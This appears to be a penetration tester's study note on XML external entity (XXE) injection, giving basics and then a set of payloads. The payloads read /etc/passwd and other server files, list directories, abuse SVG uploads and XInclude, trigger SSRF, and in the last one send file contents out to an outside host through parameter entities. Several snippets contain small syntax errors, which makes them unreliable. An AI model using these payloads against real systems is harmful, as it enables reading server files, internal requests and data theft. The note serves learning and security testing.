---
tags:
  - Web
  - xml
  - XXE
refs:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
---
---
## XXE Basics
- When application uses XML to transfer data we can try to use potentially dangerous features in XML specification
- Vulnerable when endpoints accept xml and anywhere where you can pass or upload XML you should test for XXE
- Features are supported by standard parser even if they are not used by the application
- XXE threat - view files on target server, SSRF, Exfiltrate data
### XML Basics
1. Tree-like structure
2. No pre-defined tags
3. Declining in popularity (JSON)
```xml
<?xml version="1.0" encoding="UTF-8">
<user>
	<title>XXE</title>
	<author>XXE</author>
</user>
```
- DID (Document Type Definition)
	- Contains declarations that can defile the structure of XML document and types of values it can contain
	- Can be self-contained of loaded externally (external DTD) or mixture of the two
	- Defined using the DOCTYPE keyword
- XML Custom entities
	- Entities defined in the DTD
	- Example: `<!DOCTYPE ase [<!ENTITY cheese "feta"]>` and `&cheese` will be replaced with `feta`
- XML Entity - simple way of representing data or characters
- External Entity - Custom entity which definition is outside the documents and need to be located when XML is parsed - used to read files or RCE. `[<!ENTITY cheese SYSTEM "http://feta.com/feta"]>`
---
## Typical Payloads
```xml
# 1. Set external entity
<!DOCTYPE ase [<!ENTITY cheese SYSTEM "http://feta.com/feta"]>
<customtag>&cheese;</customtag>

# 2. Read file
<!DOCTYPE ase [<!ENTITY cheese SYSTEM "file:////etc/passwd"]>
<customtag>&cheese;</customtag>
```
- **View more payloads:**  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
---
## Easy PoC
**Example:** Store update request
- See's XML in request
- Windows payload: `file:///c:/boot.ini`
```xml
# example xml
<?xml version="1.0" encodings="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>

# Add XXE test
<?xml version="1.0" encodings="UTF-8"?>
<!DOCTYPE test [<ENTITY xxe SYSTEM "file:////etc/passwd">]>
<stockCheck>
	<productId>&xxe;</productId>
---SNIP---
```
---
## Common Attacks
**Directory Listing**
```xml
# Listing /
<!DOCTYPE aa[<ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:////">]>
<root><foo>&xxe;</foo></root>

# Listing /etc
<!DOCTYPE root[<!ENTITY xxe SYSTEM "file:////etc/" >]>
<root><foo>&xxe;</foo></root>
```
**XXE via file upload**
- SVG and DOCX uses XML-based formats
- When target asked ofr non-XML files it might still accept SVG
[[Notes/1. Tools+Techniques/05. Web Application Vulnerablities/07. File Handling/File Upload|File Upload]]
- Also try `Content-Type: images/svg+xml`
```http
POST /action HTTP/1.0
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ase [ <!ENTITY xxe SYSTEM "file:////etc/passwd"> ]>
<ase>&xxe;</ase>
```
**SVG File example**
```
POST /action HTTP/1.0
Content-Type: images/svg+html

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
- View image uploaded and see hostname
**XXE via XInclude**
- Allows xml document to be built from others
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude>
	<xi:include parse="test" href="file:////etc/passwd"/>
</foo>
```
**XXE to achieve SSRF**
1. Send request to server and makes a request to endpoint on our behalf
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<http://collaborator.com> "]>

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "<http://collaborator.com> %xxe;"]>
```
**Exfiltrate data via XXE**
```
<!ENTITY % file SYSTEM "file:////etc/passwd"

<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://endpoint.com/?x=%file;'>">
%eval;
%exfiltrate;
```
